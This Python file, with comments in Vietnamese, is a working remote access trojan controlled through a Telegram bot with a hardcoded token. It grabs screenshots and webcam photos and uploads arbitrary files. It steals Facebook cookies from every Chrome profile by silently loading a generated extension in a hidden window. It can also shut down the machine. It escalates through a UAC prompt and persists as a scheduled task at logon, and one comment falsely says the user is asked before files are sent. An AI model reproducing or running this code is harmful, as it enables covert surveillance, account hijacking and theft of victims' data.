import os
import platform
import hashlib
import telebot
import tkinter as tk
from tkinter import messagebox
import threading
import tempfile
from PIL import ImageGrab
import uuid
import requests
from PIL import Image
import ctypes
import sys
import cv2
import random
import  string 
import shutil

import os
import json
import subprocess
import tempfile
import time
import signal



# === C·∫•u h√¨nh ===
BOT_TOKEN = "8111204199:AAH5gFREuwkQotJRca7p41TJB_5jyjfAGn0"
OWNER_ID = 6851056890  # ID Telegram c·ªßa b·∫°n (admin)
bot = telebot.TeleBot(BOT_TOKEN)

# T·∫°o ID m√°y (HWID hash ‚Üí s·ªë ng·∫Øn)
def get_hwid_short():
    # Thu th·∫≠p th√¥ng tin ph·∫ßn c·ª©ng
    raw_data = (
        platform.node() +
        platform.system() +
        platform.release() +
        platform.version() +
        platform.machine() +
        platform.processor() +
        str(uuid.getnode()) +
        str(os.getpid())
    )
    
    # Hash SHA256
    hwid_hash = hashlib.sha256(raw_data.encode()).hexdigest()
    
    # D√πng hash l√†m seed ƒë·ªÉ t·∫°o 3 k√Ω t·ª±: Hoa - Th∆∞·ªùng - S·ªë
    seed = int(hwid_hash[:16], 16)
    random.seed(seed)
    
    part1 = random.choice(string.ascii_uppercase)  # ch·ªØ hoa
    part2 = random.choice(string.ascii_lowercase)  # ch·ªØ th∆∞·ªùng
    part3 = random.choice(string.digits)           # s·ªë
    
    return f"{part1}{part2}{part3}"

CLIENT_ID = get_hwid_short()

# === H√†m g·ª≠i danh s√°ch file ===
def list_files():
    file_paths = []
    for root, dirs, files in os.walk("C:\\"):  # duy·ªát to√†n b·ªô ·ªï C
        for f in files:
            try:
                file_paths.append(os.path.join(root, f))
            except Exception:
                pass
    return file_paths

# === H√†m h·ªèi ng∆∞·ªùi d√πng c√≥ cho g·ª≠i file kh√¥ng ===
def ask_permission_and_send(chat_id, filepath):
    def gui_thread():
        try:
            with open(filepath, "rb") as f:
                bot.send_document(chat_id, f, caption=f"[ID {CLIENT_ID}] File: {filepath}")
        except Exception as e:
            bot.send_message(chat_id, f"[ID {CLIENT_ID}] ‚ùå L·ªói g·ª≠i file: {e}")

    threading.Thread(target=gui_thread).start()

# === X·ª≠ l√Ω l·ªánh t·ª´ Telegram ===
@bot.message_handler(commands=["start"])
def send_online(message):
    if message.chat.id == OWNER_ID:
        bot.send_message(message.chat.id, f"‚úÖ M√°y ƒëang online! ID: {CLIENT_ID}")

# ___________________________________ SCREENSHOT  ______________


@bot.message_handler(commands=["screenshot"])
def handle_screenshot(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "‚ùå D√πng: /screenshot <ID>")
            return

        target_id = parts[1]
        if target_id != CLIENT_ID:
            return  # Kh√¥ng ph·∫£i m√°y n√†y

        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] üì∏ ƒêang ch·ª•p ·∫£nh m√†n h√¨nh, vui l√≤ng ƒë·ª£i...")

        screenshot = ImageGrab.grab()

        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
            screenshot.save(tmp_file.name, "PNG")
            temp_path = tmp_file.name

        with open(temp_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo, caption=f"[ID {CLIENT_ID}] ·∫¢nh ch·ª•p m√†n h√¨nh")

        os.remove(temp_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói khi ch·ª•p m√†n h√¨nh: {e}")






# ___________________________________COOKIE ______________






 


def list_chrome_profiles():
    user_data_dir = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    if not os.path.exists(user_data_dir):
        return []

    profiles = []
    for entry in os.listdir(user_data_dir):
        profile_path = os.path.join(user_data_dir, entry)
        if os.path.isdir(profile_path):
            pref_file = os.path.join(profile_path, "Preferences")
            if os.path.exists(pref_file):
                try:
                    with open(pref_file, "r", encoding="utf-8") as f:
                        prefs = json.load(f)
                        name = prefs.get("profile", {}).get("name", entry)
                        profiles.append((name, entry))
                except Exception:
                    pass
    return profiles

def create_temp_extension():
    ext_dir = tempfile.mkdtemp(prefix="my_extension_")
    manifest = {
        "manifest_version": 3,
        "name": "Auto Facebook Cookie Downloader",
        "version": "1.0",
        "permissions": ["cookies", "downloads"],
        "host_permissions": ["*://*.facebook.com/*"],
        "background": {"service_worker": "background.js"}
    }
    with open(os.path.join(ext_dir, "manifest.json"), "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    background_js = """
chrome.runtime.onInstalled.addListener(() => {
    chrome.cookies.getAll({ domain: ".facebook.com" }, (cookies) => {
        if (!cookies || cookies.length === 0) return;

        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
        const dataUrl = 'data:text/plain;charset=utf-8,' + encodeURIComponent(cookieString);

        chrome.downloads.download({
            url: dataUrl,
            filename: "gvn.txt",
            saveAs: false
        }, (downloadId) => {
            console.log("Download started:", downloadId);
        });
    });
});
    """
    with open(os.path.join(ext_dir, "background.js"), "w", encoding="utf-8") as f:
        f.write(background_js)

    return ext_dir

def run_all_profiles_cookie():
    profiles = list_chrome_profiles()
    if not profiles:
        print("‚ùå Kh√¥ng t√¨m th·∫•y profile n√†o tr√™n m√°y.")
        return

    chrome_path = os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe")
    if not os.path.exists(chrome_path):
        chrome_path = os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe")
    if not os.path.exists(chrome_path):
        print("‚ùå Kh√¥ng t√¨m th·∫•y chrome.exe")
        return

    processes = []
    for idx, (name, folder) in enumerate(profiles, start=1):
        extension_path = create_temp_extension()
        p = subprocess.Popen([
            chrome_path,
            f"--profile-directory={folder}",
            f"--load-extension={extension_path}",
            "--new-window",
            "--window-position=-32000,-32000",  # ƒê·∫©y ra ngo√†i m√†n h√¨nh
            "--window-size=1,1",  # Thu nh·ªè c·ª≠a s·ªï
            "https://www.facebook.com"
        ], shell=False)
        print(f"üöÄ Chrome ch·∫°y v·ªõi profile {folder}, extension {extension_path}")
        processes.append(p)

    # ƒê·ª£i download ho√†n t·∫•t (v√≠ d·ª• 5 gi√¢y)
    time.sleep(1)
    subprocess.run('taskkill /f /im chrome.exe', shell=True)
    print("ƒê√£ kill t·∫•t c·∫£ chrome.exe")
 







@bot.message_handler(commands=["cookie"])
def handle_cookie(message):
    if message.chat.id != OWNER_ID:
        return

    try:
        # --- T√°ch ID t·ª´ l·ªánh /cookie <ID> ---
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "‚ö†Ô∏è B·∫°n ph·∫£i nh·∫≠p ID, /cookie <ID>")
            return
        cmd_id = parts[1]  # ID client ƒë∆∞·ª£c g·ª≠i k√®m theo

        download_dir = os.path.expanduser("~/Downloads")  # Th∆∞ m·ª•c Download m·∫∑c ƒë·ªãnh

        # --- X√≥a file c≈© tr∆∞·ªõc khi ch·∫°y ---
        for filename in os.listdir(download_dir):
            filepath = os.path.join(download_dir, filename)
            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
                try:
                    os.remove(filepath)
                except Exception as e:
                    print(f"L·ªói x√≥a file c≈© {filepath}: {e}")

        # --- Kill Chrome v√† ch·∫°y l·∫•y cookie ---
        subprocess.run('taskkill /f /im chrome.exe', shell=True)
        run_all_profiles_cookie()

        # --- G·ª≠i file cookie l√™n Telegram ---
        for filename in os.listdir(download_dir):
            filepath = os.path.join(download_dir, filename)
            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
                try:
                    with open(filepath, "rb") as f:
                        bot.send_document(message.chat.id, f, caption=f"[ID {cmd_id}] üç™ Cookie")
                except Exception as e:
                    print(f"L·ªói g·ª≠i file {filepath}: {e}")

        # --- X√≥a file sau khi g·ª≠i ---
        for filename in os.listdir(download_dir):
            filepath = os.path.join(download_dir, filename)
            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
                try:
                    os.remove(filepath)
                except Exception as e:
                    print(f"L·ªói x√≥a file sau khi g·ª≠i {filepath}: {e}")

        bot.reply_to(message, f"[ID {cmd_id}] ‚úÖ ƒê√£ l·∫•y cookie t·ª´ t·∫•t c·∫£ profiles.")

    except Exception as e:
        bot.reply_to(message, f"‚ùå L·ªói khi x·ª≠ l√Ω: {e}")








# ___________________________________ CD  ______________









@bot.message_handler(commands=["cd"])
def handle_cd(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) != 3:
            bot.send_message(message.chat.id, "‚ùå D√πng: /cd <ID> <ƒê∆∞·ªùng d·∫´n>")
            return

        target_id = parts[1]
        if target_id != CLIENT_ID:
            return

        folder_path = parts[2]
        if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
            bot.send_message(message.chat.id, f"‚ùå Th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i: {folder_path}")
            return

        ext_groups = {}

        for entry in os.listdir(folder_path):
            full_path = os.path.join(folder_path, entry)
            if os.path.isfile(full_path):
                ext = os.path.splitext(entry)[1].lower() or "<no_ext>"
                ext_groups.setdefault(ext, []).append(full_path)
            elif os.path.isdir(full_path):
                ext_groups.setdefault("<folder>", []).append(full_path)

        if not ext_groups:
            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå Kh√¥ng t√¨m th·∫•y file n√†o trong {folder_path}")
            return

        # chu·∫©n b·ªã tin nh·∫Øn
        lines = []
        for ext, paths in sorted(ext_groups.items()):
            lines.append(f"=== {ext} ({len(paths)} items) ===")
            lines.extend(paths)
            lines.append("")

        tree_text = "\n".join(lines)

        # Telegram gi·ªõi h·∫°n 4096 k√Ω t·ª± 1 tin nh·∫Øn, n√™n chia nh·ªè n·∫øu d√†i
        max_len = 4000
        for i in range(0, len(tree_text), max_len):
            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}]\n{tree_text[i:i+max_len]}")

    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói: {e}")



# ___________________________________ SHUTDOWN  ______________



# ==== L·ªánh /shutdown ====
@bot.message_handler(commands=["shutdown"])
def handle_shutdown(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "‚ùå D√πng: /shutdown <ID>")
            return

        target_id = parts[1]
        if target_id != CLIENT_ID:
            return

        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] üíÄ ƒêang ti·∫øn h√†nh t·∫Øt m√°y...")
        subprocess.Popen("shutdown /s /f /t 0", shell=True)

    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói: {e}")


# ___________________________________ WALLPAPER  ______________




def set_wallpaper(image_path: str):
    """
    ƒê·ªïi h√¨nh n·ªÅn Windows b·∫±ng file ·∫£nh
    """
    abs_path = os.path.abspath(image_path)
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE   = 0x01
    SPIF_SENDCHANGE      = 0x02

    result = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 
        0, 
        abs_path, 
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
    )
    if not result:
        raise ctypes.WinError()







@bot.message_handler(commands=["wallpaper"])
def handle_wallpaper(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) != 3:
            bot.send_message(message.chat.id, "‚ùå D√πng: /wallpaper <ID> <URL Image>")
            return

        target_id = parts[1]
        if target_id != CLIENT_ID:
            return

        url = parts[2]
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] üåÑ ƒêang t·∫£i h√¨nh n·ªÅn t·ª´ {url}...")

        # t·∫£i ·∫£nh v·ªÅ file t·∫°m
        response = requests.get(url, timeout=15)
        if response.status_code != 200:
            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå Kh√¥ng t·∫£i ƒë∆∞·ª£c ·∫£nh t·ª´ URL.")
            return

        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
            tmp.write(response.content)
            tmp_path = tmp.name

        # convert sang BMP ƒë·ªÉ Windows ch·∫Øc ch·∫Øn nh·∫≠n
        bmp_path = tmp_path + ".bmp"
        Image.open(tmp_path).save(bmp_path, "BMP")

        # set wallpaper
        set_wallpaper(bmp_path)
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚úÖ H√¨nh n·ªÅn ƒë√£ ƒë∆∞·ª£c thay ƒë·ªïi!")

        # d·ªçn file
        os.remove(tmp_path)
        # gi·ªØ bmp l·∫°i (Windows c·∫ßn file t·ªìn t·∫°i ƒë·ªÉ load)
        # n·∫øu mu·ªën x√≥a lu√¥n th√¨ ƒë·ªïi th√†nh os.remove(bmp_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói: {e}")





# ___________________________________ SENDFILE  ______________



@bot.message_handler(commands=["sendfile"])
def handle_sendfile(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.send_message(message.chat.id, "‚ùå D√πng: /sendfile <ID> <ƒë∆∞·ªùng_d·∫´n>")
            return
        target_id = parts[1]
        filepath = parts[2]
        if target_id != CLIENT_ID:
            return  # kh√¥ng ph·∫£i m√°y n√†y
        # h·ªèi user b·∫±ng GUI tr∆∞·ªõc khi g·ª≠i
        ask_permission_and_send(message.chat.id, filepath)
    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói: {e}")


# ___________________________________ CAP  ______________




# ====== L·ªánh /capture ======
@bot.message_handler(commands=["capture"])
def handle_capture(message):
    if message.chat.id != OWNER_ID:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "‚ùå D√πng: /capture <ID>")
            return

        target_id = parts[1]
        if target_id != CLIENT_ID:
            return

        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] üì∑ ƒêang b·∫≠t webcam v√† ch·ª•p ·∫£nh...")

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå Kh√¥ng th·ªÉ m·ªü webcam!")
            return

        ret, frame = cap.read()
        cap.release()
        if not ret:
            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå Kh√¥ng ch·ª•p ƒë∆∞·ª£c ·∫£nh!")
            return

        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
            cv2.imwrite(tmp.name, frame)
            tmp_path = tmp.name

        with open(tmp_path, "rb") as f:
            bot.send_photo(message.chat.id, f, caption=f"[ID {CLIENT_ID}] üì∑ ·∫¢nh webcam")

        os.remove(tmp_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ‚ùå L·ªói: {e}")



def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, ' '.join([f'"{arg}"' for arg in sys.argv]), None, 1)
    sys.exit()

import winreg
 
 
if __name__ == "__main__":
    print(f"Client started with ID: {CLIENT_ID}")
    exe_path = os.path.abspath(__file__)  # N·∫øu ƒëang ch·∫°y t·ª´ exe, s·∫Ω l√† ch√≠nh file exe ƒë√≥

    # T·∫°o task Scheduler ƒë·ªÉ ch·∫°y khi user ƒëƒÉng nh·∫≠p
    subprocess.run([
        "schtasks",
        "/Create",
        "/SC", "ONLOGON",
        "/TN", "MyAppTask",
        "/TR", exe_path,
        "/RL", "HIGHEST",
        "/F"
    ])

    bot.polling()
